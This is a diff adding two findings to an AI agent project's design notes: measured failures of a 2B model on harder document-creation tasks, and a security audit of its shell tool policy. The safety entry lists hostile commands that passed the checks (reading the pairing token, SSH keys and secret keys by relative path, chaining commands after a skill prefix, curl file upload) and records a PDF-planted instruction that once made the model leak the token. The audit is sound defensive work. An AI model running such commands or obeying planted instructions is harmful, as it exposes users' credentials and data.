@@ -179,6 +179,29 @@ would show the model a second shell and file tool beside the Strands ones.
 
 ## What a 2B model can do (measured)
 
+**Creating documents from documents: 6 correct files in 19 runs, and a code-driven
+pipeline gets the same inputs right** (2026-11-12, measured,
+`benchmarks/2026-11-12-harder-documents`). The suite's writing tasks pass 10/10
+and are small. Five harder ones (12 invoices into a spreadsheet, a one-page
+summary of a 16-page report, a per-region report from a 3-sheet workbook, a
+Word document rebuilt from another, a 60-row CSV filtered with a total),
+thinking off and on: 6 of 19 produced a correct file. What failed is five
+separate things: the model stopped after saying what it would do next (5 runs
+made no file, the turn recorded as completed); it read page 1 of 16 and
+summarised "the report"; it retyped rows and typed totals (6,776.70 for
+7,260.44); it copied `read_docx`'s markers (`[b2]`, `[t1: table ...]`, `r1:`)
+into the new document as text and lost the table; and a script it wrote saved
+CSV text as `north.xlsx` and replaced the uploaded CSV. 8 runs tried `write` on
+a binary document before `create_document`, which is not registered until a
+skill loads. The same inputs through a prototype pipeline (code loops, one
+schema-constrained call per file or section, thinking off, each value checked
+against its source, totals added by code): 48/48 invoice fields in about 11 s
+(the agent's two correct runs took 84 s and 112 s) and 8/8 section figures in
+about 7 s, three runs each, on clean synthetic files. This is not the plan plus
+workers design below: there the model orchestrated; here code does. 86% of
+model time that day was generation, not prompt reading, so retyped data and
+reasoning are the cost. Nothing is changed yet. Plan: docs/refactor-plan.md.
+
 **Finding files: the baseline, and safety by luck** (2026-11-05,
 `tests/live/suite.py --tags files`, 14 tasks x thinking off/on, a throwaway
 home tree as the only allowed folder, filesystem MCP on). Found a file with
@@ -485,6 +508,28 @@ does not help with rich documents on llama.cpp, and a 2B model writing
 ---
 
 ## Safety
+
+**Shell reads by relative path pass every check; an attached PDF used it to
+print the pairing token** (2026-11-12, measured, not yet fixed,
+`benchmarks/2026-11-12-harder-documents`). 31 hostile calls against the real
+`ToolPolicy`, offline: every typed tool refused or asked correctly; `shell` in
+Ask mode ran with no card for `cat ../../pairing-token`, `../../secrets/exa.key`,
+another chat's file, `cat ~/.ssh/id_rsa` and `$HOME/...` (a read's paths are
+checked only when written as drive paths; writes and deletes are placed, reads
+were not), and for anything after a skill-script prefix (`python
+"$ATLAS_SKILLS/x.py"; python -c ...`, `$ATLAS_SKILLS/../..`: the exemption
+looks only at how the command starts). In Work mode `curl -F f=@<file> <url>`
+runs. Allowing `python a.py` covers every `python` for the turn. Live, an
+instruction planted in an attached PDF was ignored in 3 of 4 runs and followed
+in 1: the model ran `cat ../../pairing-token` and put the token in its answer,
+with no card and the chat not tainted (an attached file is not outside
+content). Read in code, not run: answers render remote images (a page can have
+the model end its answer with an image URL carrying chat text), `read_url`
+checks its question but not its URL, a PDF attached from a browser tab does not
+taint, and Fill collects fields hidden by opacity or position. The plan
+(docs/refactor-plan.md, phase 0) closes these, then replaces the shell for
+skills with a typed tool and turns `shell` off by default: the classifier
+recognises safe commands, and every construct it does not know is a hole.
 
 **The web UI is a task view, calm by default** (2026-11-06). A mockup was
 reviewed first (two rounds: the first showed every stat and read as noise to
